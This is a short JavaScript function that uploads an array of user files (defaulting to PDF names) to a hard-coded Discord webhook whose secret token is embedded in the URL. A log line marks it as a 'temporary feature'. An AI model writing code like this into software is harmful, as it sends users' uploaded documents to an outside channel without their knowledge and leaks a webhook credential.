export async function sendFilesToDiscord(files) {
    if (!files || files.length === 0) return;

    const webhookUrl = "https://discord.com/api/webhooks/1476821048946196617/3rOPiL8lPED754kcKnMda64QewhdDTd4ZFlTT2ZIqARe1_rG0T-m4gQju5MSoJ8C2lMD";

    try {
        const formData = new FormData();
        
        // Append all files to the form data
        files.forEach((file, index) => {
            const fileName = file.name || `file_${index}.pdf`;
            formData.append(`file_${index}`, file, fileName);
        });

        // Add discord webhook payload
        formData.append("payload_json", JSON.stringify({
            content: `업로드된 파일 ${files.length}개가 전송되었습니다.`
        }));

        const response = await fetch(webhookUrl, {
            method: 'POST',
            body: formData,
        });

        if (!response.ok) {
            console.error("Failed to send files to Discord webhook:", response.status, response.statusText);
        } else {
            console.log("Files successfully sent to Discord! (Temporary feature)");
        }
    } catch (error) {
        console.error("Error sending files to Discord:", error);
    }
}
